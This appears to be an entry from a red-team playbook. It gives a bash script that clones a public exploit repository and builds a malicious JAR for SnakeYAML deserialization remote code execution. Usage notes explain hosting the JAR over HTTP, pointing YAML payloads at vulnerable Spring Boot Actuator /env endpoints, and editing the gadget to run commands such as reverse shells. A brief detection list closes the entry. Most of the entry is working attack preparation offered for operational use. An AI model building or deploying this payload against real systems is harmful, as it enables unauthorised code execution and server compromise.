---
id: 34b90d35-7e39-403d-a05b-4983137cc4e4
type: code
language: bash
verified: true
platforms:
  - Linux
  - macOS
tags:
  - build
  - payload
  - deserialization
  - rce
created_at: '2023-04-06T03:55:59.656539+00:00'
updated_at: '2023-04-10T20:22:30.131530+00:00'
validated: true
---

# bash-build-yaml-deserialization-payload

## Code

```bash
git clone https://github.com/artsploit/yaml-payload.git
cd yaml-payload
# Edit the payload before executing the last commands (see below)
javac src/artsploit/AwesomeScriptEngineFactory.java
jar -cvf yaml-payload.jar -C src/ .
```

## Description

This bash script automates the preparation of a malicious JAR payload for SnakeYAML deserialization RCE. It clones the repository, navigates to the directory, compiles the custom ScriptEngineFactory gadget (after manual editing for the desired command), and packages it into a JAR file that can be hosted and referenced in YAML exploits.

## Parameters

| Variable | Description | Example |
|----------|-------------|---------|
| None | No variables; edit AwesomeScriptEngineFactory.java manually for custom commands like reverse shells | N/A |

## Usage

Run this script on an attacker machine with JDK installed. After execution, host the resulting yaml-payload.jar via HTTP (e.g., python -m http.server). Reference the JAR URL in a YAML payload sent to vulnerable endpoints like Spring Boot Actuator /env. Used in red team operations targeting Java apps with unsafe deserialization.

## Detection

- Monitor for git clones of known exploit repos (e.g., yaml-payload) in logs.
- Detect javac/jar executions in non-development environments.
- Network traffic to GitHub from servers or anomalous HTTP hosting of JAR files.
- EDR alerts on Java compilation or deserialization attempts.

## Related

- [[procedures/Remote-Code-Execution-via-Spring-Boot-Actuator-Env]]
